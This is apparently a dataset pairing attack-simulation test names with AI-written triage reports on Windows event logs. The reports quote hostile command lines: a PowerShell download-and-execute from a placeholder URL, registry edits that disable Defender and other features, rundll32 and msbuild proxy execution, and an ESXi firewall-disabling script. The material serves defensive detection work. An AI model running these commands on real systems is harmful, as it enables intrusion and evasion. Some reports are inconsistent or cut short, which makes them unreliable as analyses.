Disable Windows Prefetch Through Registry,"### Detailed Analysis

The provided logs span system, sysmon, application, and security events on a Windows machine named Server002, focusing on the time frame around October 24, 2024.

#### Suspicious or Anomalous Behavior

1. **Frequent Use of wevtutil.exe and conhost.exe by admin_test User**:
   - The Sysmon logs show multiple events related to the execution of `wevtutil.exe` and `conhost.exe` under the user `SERVER002\\admin_test`.
   - These tools can be used for legitimate purposes like managing event logs and hosting console windows, respectively; however, repeated rapid execution of `wevtutil.exe` could indicate an attempt to clear or manipulate event logs, a known tactic among adversaries to cover tracks.

2. **Registry Modification Using cmd.exe and reg.exe**:
   - A `cmd.exe` process executed with a command line to modify the registry: `reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters"" /v ""EnablePrefetcher"" /t REG_DWORD /d 0 /f`.
   - This command modifies the Windows Prefetcher feature settings, which is not typical user activity and might indicate an attempt to alter system performance or obscure usual system operations.

3. **Multiple Process Executions within a Short Time Frame**:
   - The logs depict numerous process executions like `hostname.exe`, `whoami.exe`, and additional command line utilities within a tight time frame (seconds apart), which could suggest automated scripts or commands being carried out.

4. **Time Manipulation Events**:
   - There are system and security logs indicating time change events initiated by `svchost.exe`, which could reflect legitimate NTP adjustments. However, time tampers are also a technique to disrupt forensic investigations.

#### Potential Malicious Indicators

- The rapid execution of multiple system utilities (`wevtutil.exe`, `reg.exe`, `cmd.exe`) especially when combined with unusual registry edits, suggests tampering activities potentially aimed at obfuscation or preparing the system for exploitation.
- The `admin_test` account appears central in executing these commands, warranting further scrutiny on this user's activities.

### Assessment of the Situation

The activities observed in the logs highlight anomalous behaviors that could point to suspicious activity:

- **Registry modifications** and the **use of wevtutil.exe** to manage logs can be legitimate but raise red flags without proper context, especially given their frequency and timing.
- The patterns of execution suggest automated control, possibly indicative of a script or remote management tool being utilized without clear legitimate purpose.

### Resolution

**Resolution**: **SUSPICIOUS**

The activities observed are suspicious and warrant deeper investigation. While there are no definitive signs of a breach, the behaviors such as frequent system utility execution, registry modifications, and potential log manipulation signify unusual activity that could precede or indicate attempted compromise.

   - Confirm if the registry changes are part of any sanctioned IT operations or group policies. If not, further investigate the source and purpose.

3. **Examine Network Traffic**:
   - Analyze network traffic to and from Server002 around the timeframe for any unusual or unauthorized communication.

4. **Monitor for Recurrence**:
   - Enhance monitoring on Server002 for any recurrence of similar activities and potential new indicators of compromise.

By following these steps, you can ascertain whether these logs correlate with a potential security incident or if they align with approved administrative activities."
Rundll32 syssetup.dll Execution,"Based on the Sysmon logs provided, I have analyzed the following events for any indicators of suspicious or malicious activity:

### Detailed Analysis:

1. **Process Execution of PowerShell**:
   - A process executed `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` under the user `SERVER002\admin_test`. PowerShell is a legitimate tool but can be used for malicious purposes. This execution alone is not inherently suspicious but is worth noting in context.

2. **Repetition of wevtutil.exe Execution**:
   - Several instances of `C:\Windows\System32\wevtutil.exe` execution were logged. This tool is used to manage event logs. While legitimate, its repeated execution can be indicative of log manipulation or clearing by an attacker.

3. **CMD and rundll32.exe Execution**:
   - A command was executed via `cmd.exe` using the following command line: `""cmd.exe"" /c rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.011\src\data.011_DefaultInstall.inf""`. 
   - The use of `rundll32.exe` to execute scripts from an INF file can be indicative of malicious activities. INF files are often used in malware operations to run code implicitly.

4. **Execution of whoami.exe**:
   - `whoami.exe` was executed. This command is typically used to display the current logged-in user. While this is a legitimate tool, it's often used by attackers to confirm the context in which they have access.

5. **Use of conhost.exe**:
   - Various instances of `conhost.exe` executions are seen following legitimate processes. The process `conhost.exe` is a generic console window host that is typically seen associated with command-line executions.

6. **Execution of WmiPrvSE.exe and svchost.exe**:
   - `WmiPrvSE.exe` and `svchost.exe` were executed under the `NT AUTHORITY\SYSTEM`. These processes are typically associated with legitimate system activities but can be leveraged in attacks for persistence or execution of remote commands.

### Assessment:

- **Multiple Executions of wevtutil.exe** can indicate attempts to tamper with event logs.
- **Cmd.exe and rundll32.exe Activity** with INF files is a suspicious pattern, as this is an unusual method for execution and is often utilized by malicious actors for executing arbitrary code.
- **PowerShell Invocation** alongside other suspicious activities raises a flag for potential script-based attacks or post-exploitation activity.
- **Integrity Level: High** seen for executed processes suggests actions are being performed with elevated privileges.

### Resolution:

- **SUSPICIOUS**: The combined presence of log manipulation, unusual use of rundll32, and PowerShell activity dictate that this requires further investigation. While no clear payload execution or conclusive evidence of data exfiltration is present, these indicators are consistent with possible malicious activity or preparation for further stages of an attack.

### Guidance:

1. **Immediate Actions**:
   - Investigate the origin and contents of the `data.011_DefaultInstall.inf` file to ascertain its nature.
   - Analyze network activity and connections established during the timeframe of these logs to identify any anomalies or unauthorized data flows.

2. **Additional Analysis**:
   - Check for the existence of any persistence mechanisms or altered startup entries.
   - Review full event logs for any additional corroborating evidence of compromise or related activities.
  
3. **Preventive Measures**:
   - Consider tightening monitoring and logging policies around critical systems, especially those accessed by privileged accounts.
   - Update detection tactics to flag such patterns for immediate alerts in future events."

MSBuild Bypass Using Inline Tasks (VB),"### Analysis:

Upon reviewing the provided logs, several activities stand out that are suspicious and warrant further investigation:

1. **Unusual PowerShell Activity**:
   - There's a PowerShell execution by user `SERVER002\\admin_test` as seen in the first Sysmon log entry:
     ```json
     {""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""}
     ```
   - PowerShell is frequently used by threat actors for various malicious activities due to its powerful capabilities.

2. **Execution of `wevtutil.exe`**:
   - Multiple instances of `wevtutil.exe` were executed by the same user:
     - Wevtutil is a command-line utility that can be used to clear event logs, which might indicate an attempt to cover tracks.

3. **Execution of `msbuild.exe` with Logger Style Commands**:
   - The log details show an execution chain involving Windows Command Processor (`cmd.exe`) invoking MSBuild to compile or execute a file from a temporary directory:
     ```json
     {""@Name"":""CommandLine"",""#text"":""\""cmd.exe\"" /c C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.001\\src\\vb.xml\""""}
     ```
   - While `msbuild.exe` is a legitimate application used for building projects, it can also be misused by attackers to execute code.

4. **`whoami.exe` Execution**:
   - The presence of `whoami.exe` execution may indicate the user/process checking for active user sessions. This is not inherently malicious, but contextually, it follows other suspicious behaviors:
     - Checking for privileges can be an indicator of an attacker determining the current user context.

5. **Behavior of Edge Updates**:
   - Several processes related to Microsoft Edge Update are logged, which by themselves are not unusual. However, the amount and chain sequencing observed could hide something more complex if misused by a threat actor.

6. **High Privilege Usage**:
   - Logs report elevated tokens and special privileges being assigned (e.g., `SeImpersonatePrivilege`, `SeDebugPrivilege`), which could indicate privilege escalation attempts.

### Conclusion:

Based on the various activities, particularly the batch execution of suspicious processes, execution of build tools commonly leveraged in attacks, and utilities relating to system events and privilege escalations, the logs contain abnormal activities that require further investigation. These actions might be part of penetration testing, administrative scripting, or actual malicious activity.

### Resolution: **SUSPICIOUS**

**Guidance**:
- **Perform a thorough forensic investigation** of the endpoints involved.
- **Verify user activity** with `SERVER002\\admin_test`, understanding legitimate activities and potential abuse.
- **Review PowerShell command logs** and associated scripts if available to determine intent.
- **Investigate any service account activities** especially concerning `SYSTEM` privileges.
- Enhance monitoring for **pattern behaviors**, such as repeated use of command-line tools like `wevtutil.exe` or `msbuild.exe`.

Additionally, notify the security operations team to maintain heightened vigilance and potentially isolate the systems involved until a complete review is conducted to prevent any potential data breaches or unauthorized access continuation."
Disable Windows Shutdown Button,"The provided Windows event logs indicate a series of events, some of which raise red flags for potential malicious activity. I will analyze key entries and summarize suspicions:

1. **Time Manipulation**: In the Security logs, EventID 4616 indicates a change in the system time (PreviousTime to NewTime). This is often seen in attacks where attackers attempt to evade detection mechanisms dependent on timestamps. Time manipulation can potentially disrupt audit controls and log integrity.

2. **Privilege Escalation**: The Security log shows EventID 4672, indicating that the user ""admin_test"" was granted a list of high-level privileges (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.) upon logging in. This includes privileges that typically are not needed for regular operations, suggesting a potential for privilege escalation.

3. **Logon Activity**: EventID 4624 indicates a successful network logon of the account ""admin_test"". The use of the NTLM authentication package, along with the source IP being a local link-local address, could suggest lateral movement or external access if that IP is unexpected.

4. **System Utility Execution**: In the Sysmon logs, multiple instances of `wevtutil.exe`, `conhost.exe`, and `reg.exe` being run by ""admin_test"". Particularly of concern is the command run by `cmd.exe` to edit registry settings (`reg add`). Modifying registry settings can indicate an attempt to maintain persistence or alter system configurations for malicious purposes.

5. **Hostname and Whoami Use**: Sysmon logs also note the execution of `hostname.exe` and `whoami.exe` by ""admin_test"". These utilities can be used to gather information about the system environment during enumeration by an attacker.

6. **Registry Modification Attempt**: The command executed by `cmd.exe` involves a registry modification to the ""shutdownwithoutlogon"" policy, which is suspicious as it could be an attempt to disable certain security controls.

Based on the analysis of these logs:

- **Malicious Indicators**: Time discrepancy, privilege obtainment with potentially unrequired high-level privileges, and registry modifications without clear legitimate purpose.

- **Assessment**: The activities noted, particularly the use of tools and privileges, the manipulation of system time, and registry edits, align with indicators of compromise. They suggest either an internal actor with malicious intent or an external party gaining unauthorized access and escalating privileges.

- **Resolution**: **MALICIOUS**. These actions reflect behavior often associated with malicious activity, such as time manipulation, unauthorized privilege escalation, and unauthorized system alterations.

**Guidance on How to Proceed**:
1. **Immediate Containment**: Isolate the affected system from the network to prevent further spread.
2. **Detailed Investigation**: Conduct a thorough forensic analysis to identify the extent of the compromise.
3. **User Review**: Verify the legitimacy of the ""admin_test"" account and its activities.
4. **Access Review**: Analyze access logs and patterns from the originating IP and associated accounts.
5. **System Restoration and Hardening**: Restore the system from a known good backup, and strengthen security settings to prevent future incidents.
6. **Monitor and Alert**: Set up monitoring for key changes, especially around user privileges and system settings. 

Examples of such activities must be followed up with a response team involving HR, IT, and legal departments, considering the potential insider threats or business continuity plans."
Enable Proxy Settings,"**Detailed Analysis of the Logs:**

Upon reviewing the provided logs from various Windows event sources, the following points of interest and potential concerns were identified:

1. **Security and System Logs:**  
   - *Event ID 4616*: Multiple entries indicating a change in system time through the `svchost.exe` process. While legitimate software may occasionally adjust system time (e.g., time synchronization services), frequent or unexplained time changes can be a tactic used by malware to interfere with logs or for other purposes.
   - *Time Service Event (Event ID 35)*: Indicates synchronization with a time server, which appears normal within the context of System logs.
  
2. **Sysmon Log:**
   - Observed frequent and rapid invocation of common Windows utilities (`wevtutil.exe`, `conhost.exe`, `cmd.exe`, `reg.exe`, and `whoami.exe`) by the user `SERVER002\\admin_test`. The presence of command-line arguments modifying registry settings via `cmd.exe` with `reg.exe` to enable a proxy (`HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings`) is suspicious.
   - This registry modification is executed using a command line, suggesting potential script-driven or automated activity.
   - The execution of `whoami.exe` may suggest an attempt to query the current user context, which is sometimes used in periods of lateral movement or privilege escalation attempts.

3. **Command-line usage in `Sysmon` (notably with Event ID 1 and 5)**:
   - The direct registry modification by `cmd.exe` is typically indicative of potential malicious activity or system misconfiguration. The addition of a proxy by manipulating the registry is a common technique to redirect user traffic or infiltrate network communications. The use of high integrity level suggests it was executed with elevated privileges, which increases suspicion in a typical endpoint or server context.

**Assessment of the Situation:**

Based on the above analysis, the logs contain a mix of seemingly legitimate system activity (like time synchronization and routine service execution) and suspicious activity (e.g., rapid execution of system utilities with an emphasis on registry modifications and potential network configuration changes).

**Threats or Risks Identified:**

- The unauthorized modification of the registry and enabling of a proxy could potentially allow for traffic interception or system manipulation.
- The frequent execution of command-line tools and registry modifications justifies heightened concern about potential malicious scripts or unauthorized administrative activity being executed on the system.
  
**Guidance on How to Proceed:**

1. **Further Investigation:**
   - Verify the legitimacy of the account `SERVER002\\admin_test` and confirm with the intended user whether this activity was authorized or expected.
   - Cross-reference this activity with other security solutions (e.g., EDR solutions) to investigate any correlated alerts or detect potential threats.
   - Check network logs for any unusual outbound connections post-registry modification.
  
2. **Immediate Actions:**
   - Consider isolating the system to prevent potential spread if further malicious activity is detected.
   - Update security solutions and perform a full system scan for malware or unauthorized access scripts.
   - Document findings and, if necessary, escalate to incident response for containment and remediation.

**Resolution:**

- **SUSPICIOUS**: The activity raises concerns that warrant additional investigation to rule out potential malware or unauthorized configuration changes. Further analysis should focus on confirming whether the registry modifications involved a deliberate security measure or a precursor to malicious actions.
"
WinPwn - UAC Magic,"Upon reviewing the provided logs, several elements stand out which indicate potentially suspicious and possibly malicious activity. Here is a detailed analysis:

### Windows PowerShell Logs:
1. **Suspicious PowerShell Command-Line Execution:**
   - The PowerShell log events show a command involving the use of `iex(new-object net.webclient).downloadstring()` to download a script from a URL (`https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1`) and execute it.
   - This method is generally used by attackers to execute remote scripts and is a classic indicator of potentially malicious behavior.
   - The command is wrapped in a structure which suggests it could bypass certain security controls or logging mechanisms (`-noninteractive`, `-command ""C:\\windows\\system32\\cmd.exe""`).
   - The use of the URL appearing with ""raw.githubusercontent.com"" raises red flags as these are often used by malicious actors to host scripts due to their open and accessible nature.
   - The presence of `-technique magic` in the command is unusual and could imply an obfuscation or special technique, which can be an indicator of evasion.

### Security Logs:
1. **Privilege Escalation Activities:**
   - EventID 4672 indicates that an account (`admin_test`) has a rich set of privileges granted, including `SeDebugPrivilege`, `SeLoadDriverPrivilege`, and `SeImpersonatePrivilege`. These privileges are powerful and could be exploited by an attacker if they have gained access.

2. **Login Events:**
   - There are multiple EventID 4624 logon events with type 3 (network logon) associated with `admin_test`, suggesting remote access or some automated process.

### Sysmon Logs:
1. **Process Execution Monitoring:**
   - Analysis of process creation events shows consistent creation of processes like `wevtutil.exe` and `conhost.exe` by the user `ADMIN_TEST`.
   - The execution of `PowerShell.exe` using high integrity levels and specifically with suspicious command lines (as seen in PowerShell logs) seems to align with the potentially malicious PowerShell activities observed.
   - There’s continuous spawning of console host processes (`CONHOST.EXE`) which can sometimes be used to host terminal interfaces; however, context from PowerShell points to potentially nefarious scripted activity.

### Application & System Logs:
- These seem normal with no direct indicators connecting to malicious activities but further cross-referencing might provide supportive context.

### Conclusion:

Based on the above observations, the activities logged in various logs suggest:
- **Malicious Activity**: The PowerShell logs provide strong evidence of potentially malicious script execution, indicative of efforts to download and execute unwanted scripts, likely aimed at compromising the system's security.

### Guidance:
- **Immediate Threat Response**: Quarantine the affected device to prevent further execution of any potentially malicious scripts and to protect the network.
- **Malware Analysis**: Consider analyzing the downloaded script if accessible in a sandboxed environment to understand intent and capability.
- **Access Review**: Evaluate all active sessions from or related to the `admin_test` account to determine if unauthorized access occurred.
- **Hardening Measures**: Implement geofencing or URL filtering to block potential threat sources and employ stricter script execution policies.

**Resolution**: MALICIOUS - The logs indicate activity that is consistent with malicious behavior."
Delete TeamViewer Log Files,"### Detailed Log Analysis:

#### Windows PowerShell Log:

- There is a repeated pattern across multiple logs showing PowerShell execution with the command: `powershell.exe & {New-Item -Path $env:TEMP\\TeamViewer_54.log -Force | Out-Null Remove-Item $env:TEMP\\TeamViewer_54.log -Force -ErrorAction Ignore}`. This suggests:
  - The creation and immediate deletion of a log file (`TeamViewer_54.log`) in the TEMP directory.
  - The operation could potentially mask the execution of a command or script by not leaving any traces, which is often a tactic used to obfuscate activities.

#### System Log:

- Regular but benign system activities, such as time changes and updates, are observed. These seem to originate from `svchost.exe`, a typical system process, and do not raise an immediate red flag.

#### Security Log:

- The logs indicate time synchronization activities performed by `svchost.exe` running under the LOCAL SERVICE account — standard behavior for time synchronization.

#### Application Log:

- The `Microsoft-Windows-Security-SPP` logs show routine entries related to the software protection service — common administrative logs.
- EdgeUpdate service entries indicate starting and stopping, likely related to routine updates by the Edge browser, matching with Sysmon observes.

#### Sysmon Log:

- **Process Activity**: Multiple processes executed by the `SERVER002\admin_test` user targeting system utilities like `whoami.exe`, `wevtutil.exe`, `hostname.exe`, indicative of enumeration activities.
- **Edge Update**: A series of processes involving `MicrosoftEdgeUpdate.exe` performing updates. This is consistent with legitimate software update activities.
  
### Assessment:

- **Suspicious PowerShell Usage**: The PowerShell script is noteworthy. While file operations alone aren't necessarily malicious, the combination of creating and immediately deleting files with insignificant purpose could suggest the presence of further code execution that gets stripped from logs.
- **Enumeration Activities**: Usage of utilities like `whoami.exe` and `wevtutil.exe` could indicate hacker reconnaissance efforts, although admin users may have legitimate reasons for such activities.
- **Benign System and Application Logs**: No immediate red flags beyond update-related activities and typical system processes.

### Recommendation:

1. **Further Investigation:**
   - Examine the context and source of the PowerShell command which seems to hide its tracks. Consider checking script block logging or any other contextual logs to uncover potential obfuscated malicious actions.
   - Validate user `admin_test` actions for legitimacy and any signs of credential misuse.
   
2. **Enhanced Monitoring:**
   - Increase logging and monitoring on critical machines such as the CEO’s machine and Server002 to capture complex behaviors.
   - Monitor other access and usage activities for `admin_test`.

3. **Review Security Protocols:**
   - Ensure PowerShell and other command utilities are restricted and audited for unauthorized users.
   - Inspect security policies and ensure updates and patches are applied to minimize vulnerabilities.

### Resolution: **SUSPICIOUS**

The levels of suspicious behavior, notably the PowerShell scripting, warrant further investigation to rule out potential compromise or unauthorized use."
Abusing MyComputer Disk Backup Path for Persistence,"Upon reviewing the provided logs, a few entries stand out as potentially suspicious. Let's analyze these:

### Analysis

1. **Frequent Use of `wevtutil.exe` by `admin_test`:**
   - In the logs, we see multiple consecutive executions of `C:\Windows\System32\wevtutil.exe` under the `SERVER002\admin_test` account. `wevtutil.exe` can be used to clear event logs, which may be an indication of an attempt to cover tracks. However, this tool also has valid administrative uses.

2. **Registry Modification via `cmd.exe`:**
   - A command was executed using `cmd.exe` that modifies the Windows Registry:  
     ```
     reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\BackupPath"" /t REG_EXPAND_SZ /d ""%%systemroot%%\system32\notepad.exe"" /f
     ```
   - While this action is not inherently malicious, modifications to critical registry paths are often indicative of persistence mechanisms being established by malware. This needs further investigation to ensure it is not unauthorized or malicious.

3. **Typical Update Activities from Microsoft Edge Update:**
   - There are multiple logs showing the execution of the Microsoft Edge Update process. These activities are typical for legitimate updating processes and match standard behavior for automatic updates. The logs indicate the expected System integrity level and NT AUTHORITY\SYSTEM user context for updates.

- **SUSPICIOUS**: The presence of potentially anomalous registry modifications through PowerShell, especially those affecting security parameters, necessitates further investigation to confirm legitimacy and intent. It's advisable to investigate the specific PowerShell script origin, context, and approval, checking for any unauthorized access or configuration changes. Additional investigation on the user ""SERVER002\\admin_test"" and recent activities could provide more clarity on whether this behavior fits usual administrative actions or indicates a compromise."
Tamper with Windows Defender Registry - Powershell,"Upon examining the provided Windows event logs, several areas of concern suggest potential malicious activities:

### 1. **Windows PowerShell Activity:**
The PowerShell logs reveal a script execution that explicitly disables multiple security features of Windows Defender, including:
   - Disabling AntiVirus and AntiSpyware
   - Disabling various Real-Time Protection features
   - Tampering with TamperProtection
   - Disabling enhanced notifications

This script is highly suspicious as it significantly weakens the system's security posture and could be indicative of a malicious actor trying to evade detection or preparing the system for further compromise.

### 2. **Sysmon Events:**
The Sysmon logs show multiple instances of system utilities like `wevtutil.exe` and `conhost.exe` being executed by a user identified as `SERVER002\admin_test`. While these utilities can be used for legitimate administrative tasks, their concurrent execution in such a pattern could suggest they were used for malicious purposes such as event log tampering or command-shell interactions aimed at maintaining persistence or covering tracks.

### 3. **Process Execution:**
Multiple instances of `MicrosoftEdgeUpdate.exe` and its related processes were executed. Although these could be related to legitimate software updates, the concurrent tampering with Windows Defender and the use of system processes in a short span of time increases suspicion. The presence of temporary paths (`C:\\Program Files (x86)\\Microsoft\\Temp\\EU92DF.tmp`) for some of these processes could also signify an untrusted source was used for code execution.

### **Overall Assessment:**
The combination of disabling key security features via PowerShell, potential log tampering using `wevtutil.exe`, and suspicious process execution strongly points towards malicious activity. There is a high likelihood of a compromise aimed at either evasion or preparation for more severe threats.

### **Resolution:**
**MALICIOUS** - The logs contain clear evidence of malicious intent and actions, specifically in trying to disable security mechanisms and suspicious command executions that are indicative of an active or attempted compromise.

### **Guidance on How to Proceed:**
1. **Immediate Response:**
   - Isolate the affected system (Server002) from the network to prevent further spread or data exfiltration.
   - Conduct a full forensic analysis on the machine to identify and understand the complete scope of the compromise.

2. **Remediation Steps:**
   - Re-enable and reconfigure Windows Defender settings to ensure active protection.
   - Review user accounts and privileges, specifically for the `SERVER002\admin_test` account for any unauthorized changes.
   - Check recent system updates and patches for legitimacy and completeness.

3. **Long-Term Monitoring:**
   - Implement enhanced monitoring of PowerShell activities and Sysmon events for early detection of similar activities.
   - Regularly audit security configurations and conduct awareness exercises for users with administrative privileges."
ESXi - Disable Firewall via Esxcli,"I have analyzed the provided Windows event logs from Sysmon, specifically focusing on process creation events and any indicators of potentially suspicious or malicious activity. Here's a detailed breakdown of the findings:

1. **Use of PowerShell**: There is an event indicating the execution of PowerShell (`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`) by the user `SERVER002\admin_test`. This alone is not inherently suspicious, but PowerShell is often leveraged in attacks, and its use should be further scrutinized.

2. **Usage of `wevtutil`**: We see multiple events for the execution of `wevtutil.exe`. This tool is used to manage the Windows Event log service and its logs or to export the event logs. Frequent execution without a clear administrative task or system maintenance rationale might be considered suspicious as it can be used to manipulate or clear logs after an intrusion.

3. **Command Execution and Privilege Escalation**:
   - The command line entry shows `cmd.exe` executing a script using `plink.exe`, which is a part of the PuTTY suite and used for SSH connections. This instance seems to be using SSH to disable the firewall on an ESXi host (`-m C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\\files\\data.004\\src\\esxi_disable_firewall.txt`). This could indicate malicious intent, particularly if this action was not sanctioned as part of routine administrative processes. This command is being executed by the `admin_test` user in a high-integrity context, suggesting elevated privileges.

4. **Edge Update Activity**: There are multiple events from the Microsoft Edge Update components running various tasks (`/svc`, `/regsvc`, `/regserver`, `/ping`, `/ua`). While these actions are part of the Edge Update process, they generate a high volume of events and, under certain circumstances, could potentially be used to obfuscate malicious activities. However, without further context or anomalies, these activities do not directly indicate malicious intent.

5. **Prevalence of `conhost.exe`**: The presence of `conhost.exe` as a frequent process might indicate console interaction via command-line activities. Its appearance supporting potentially questionable `cmd.exe` process execution warrants further examination.

### Assessment:
The combination of PowerShell execution, frequent use of `wevtutil`, and SSH commands intended to disable a firewall suggests potential unauthorized activity or malicious intent, especially if these actions were performed without proper authorization from the IT or security team.

### Resolution:
**MALICIOUS** - The activity, specifically involving disabling a firewall through SSH using a PuTTY suite tool and high-integrity execution, points to potential compromise. This behavior is aligned with tactics seen in malicious campaign scenarios where attackers aim to penetrate and sustain access on networks.

### Recommended Actions:
1. **Immediate Isolation**: Isolate the CEO's machine and possibly the intranet systems that might have been accessed or affected.
2. **Log Review and Correlation**: Perform a thorough review of logs to identify any lateral movement or additional suspicious activities across connected systems.
3. **Credential Audit**: Investigate whether the credentials used in the suspicious activities were compromised.
4. **Security Monitoring**: Enhance real-time monitoring for indicators that correlate with these events.
5. **Incident Response**: Initiate a full incident response procedure to assess the breach's scope and take action to remediate the compromise.

Considering the seriousness of the potential threat, work closely with your cybersecurity team to investigate and secure the network promptly."
Msiexec.exe - Execute Local MSI file with an embedded EXE,"**Detailed Analysis:**

1. **Unusual Process Execution:**
   - The Sysmon logs indicate the execution of multiple system utilities and common executables such as `powershell.exe`, `wevtutil.exe`, `cmd.exe`, `msiexec.exe`, and `conhost.exe` by the user `SERVER002\admin_test`.
   - The use of `cmd.exe` with a command line to execute `msiexec.exe` installing an MSI from a temporary directory stands out: 
     ```
     ""cmd.exe"" /c c:\windows\system32\msiexec.exe /q /i ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.007\bin\data.007_EXE.msi""
     ```
   - Such execution warrants scrutiny as running installers from a temporary directory can be an indication of unwanted software or malware installation.

2. **Indicators of Malicious Activity:**
   - The installation of a package from a temporary path using `msiexec.exe` is suspicious, especially when:
     - The MSI file originates from a path (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.007\bin\data.007_EXE.msi`) often used for temporary operations.
     - The `cmd.exe` process triggering the MSI execution raises concerns about the legitimacy and intent of this operation.
   - There is an entry indicating the execution of `hostname.exe`, `whoami.exe`, and `conhost.exe` preceding the suspicious MSI installation. While these processes by themselves are not inherently malicious, they can be used by malicious actors to gather environment details or mask activities.

3. **Application Log:**
   - The application log shows entries related to the installation of ""file file Test Installer"" which successfully completes:
     ```
     Product: file file Test Installer -- Installation completed successfully.
     ```
   - The origin and purpose of this software is not clear from the logs, making it crucial to verify its legitimacy.

**Assessment:**

- There are strong indicators of potentially malicious activity, given the combination of command execution patterns (`cmd.exe` invoking `msiexec.exe` from a temporary path) and the installation of an unclear package from a user/admin test environment.
- The lack of additional context or known legitimacy for ""file file Test Installer"" warrants further investigation to ensure no malicious software or unauthorized activity has occurred.

**Resolution:**

- **SUSPICIOUS**: The logs contain activities that raise suspicion and require additional investigation to determine the intent and legitimacy of the ""file file Test Installer"" and the involved processes.

**Guidance on How to Proceed:**

1. **Immediate Actions:**
   - Verify the origin and purpose of the ""file file Test Installer"" with IT or the relevant department.
   - Check if other systems exhibit similar behaviors or installations indicative of lateral movement.

2. **Further Investigation:**
   - Inspect the network logs for connections established by the system around the event timestamp.
   - Review antivirus or endpoint security logs for any detections or alerts related to the installed MSI.
   - Ensure the integrity of the PowerShell, wevtutil, and conhost activities by reviewing detailed command-line arguments and subsequent actions.

3. **Remediation and Monitoring:**
   - If deemed unauthorized or malicious, remove the installed package and isolate the system if necessary.
   - Enhance monitoring and logging policies to capture more detailed command-line arguments in similar future events.
   - Educate the user base about the risks of executing unknown installers or software, especially from temporary locations."
Azure - Eventhub Deletion,"Analyzing the provided Windows event logs indicates some unusual behavior. Here’s a detailed assessment:

### Suspicious or Anomalous Behavior:
1. **PowerShell Activity**: The PowerShell log indicates suspicious activity due to the execution of a script that uses `ConvertTo-SecureString` to handle an empty ""secure"" password and attempts to connect to Azure AD and remove an event hub (`Remove-AzEventHub`). This could potentially be benign, but it is suspicious without appropriate context or authorization. Such actions should ordinarily be accompanied by legitimate credentials and authorization from IT administration.

2. **Process Monitoring (Sysmon Logs)**: 
   - Multiple instances of `wevtutil.exe` and `conhost.exe` execution in close succession appear in the Sysmon logs. `wevtutil.exe` is used for querying and manipulating event logs, which may indicate tampering or unauthorized log access or clearing activity.
   - A script executed via `powershell.exe` is flagged, consistent with the PowerShell log’s concerning activity.
   - There is also substantial activity from `setup.exe` related to Microsoft Edge updates. This could be normal system behavior if legitimate updates are occurring; however, its prevalence indicates it should be investigated to ensure it aligns with expected update schedules.

3. **Security Auditing**: The Security log captures an event (ID 4799) indicating account management-like operations potentially tied to the execution of Microsoft Edge updater (`setup.exe`). While this might be benign, it requires confirmation that it aligns with legitimate processes.

### Evaluation of Malicious Activity:
Combining the information gathered:
- The PowerShell command is suspicious since it involves credential handling and modification of Azure resources without visible legitimate actions or context.
- The `wevtutil.exe` invocation in Sysmon logs could be a sign of log alteration attempts, especially without corresponding legitimate actions.
- Multiple `setup.exe` related activities could suggest software updates, though the volume and context should be corroborated.

### Threat Assessment & Risks:
- **Potential Threat**: Use of PowerShell for unauthorized actions in an Azure environment suggests a potential security breach or misconfiguration version with misused privileges.
- **Log Tampering**: The repeated execution of `wevtutil.exe` suggests potential modification or clearing of logs, possibly masking malicious activity.

### Guidance:
Given the noted activities:
1. **Investigate Credentials and Azure Activity**: Verify if the PowerShell activity was authorized. Check Azure AD logs for abnormal access and actions.
2. **Audit Log Access**: Check for changes in event logs and ensure no clearing or unauthorized modifications have occurred.
3. **Software Updates**: Confirm the legitimacy of the Edge update activities by checking against IT managed update schedules or Microsoft’s official release notes.
4. **Incident Response**: Depending on further findings, consider escalating to incident response if unauthorized access or credential misuse is confirmed.

### Resolution:
The logs lead to the conclusion that the situation is:
- **SUSPICIOUS**: Activities observed suggest potentially unauthorized operations needing further investigation, but don't definitively confirm malicious intent without additional context."
MSBuild Bypass Using Inline Tasks (C#),"Upon analysis of the provided Sysmon logs, the following indicators of potentially suspicious activity were observed:

1. **Excessive Usage of `wevtutil.exe`**: There are multiple instances of `wevtutil.exe`, which is a legitimate utility used for managing event logs. The repeated and rapid execution of this utility (ProcessIDs: 5416, 6200, 5556, 6980) in a short timeframe without apparent context or associated command lines could suggest log manipulation activities which are commonly used to cover tracks.

2. **Command Execution via `cmd.exe`**: An instance of `cmd.exe` was executed with a command line argument invoking `msbuild.exe` with a specific .csproj file from a temporary path (`data.001.csproj`). While `msbuild.exe` is a legitimate tool, its use in this manner is often associated with executing malicious payloads or compiling malicious code on the fly (ProcessID: 1676).

3. **Potential C# Compiler (`csc.exe`) Invocation**: The command line indicates a C# project compilation using `csc.exe` started by `msbuild.exe`. This can be indicative of a script or code being executed that could have adverse or unauthorized effects on the system (ProcessID: 6220).

4. **PowerShell Indicative Activity**: There was an instance of PowerShell being invoked, but without sufficient details due to lack of command line capture. PowerShell can be a vector for script-based attacks.

5. **Frequent Edge Update Processes**: Numerous Edge Update related processes are executed with various command line arguments (`/regsvc`, `/regserver`, `/svc`, `/c`, `/ua /installsource core`). While it might align with legitimate update processes, the context and frequency require ensuring these are verified against expected update activities.

6. **Process Execution from Temporary Directories**: Microsoft Edge Update agents are seen running from temporary directories which could signify a temporary download or install location, but from a security standpoint, executing code from temp directories should be monitored more closely (ProcessID: 6632, 1388).

Based on these observations, the following assessment is made:
- Continuous and rapid execution of `wevtutil.exe` can be suspicious if not part of standard administrative actions or updates.
- The use of `cmd.exe` to run `msbuild.exe` with project files located in a temporary directory aligns with potential unauthorized code execution or persistence techniques.

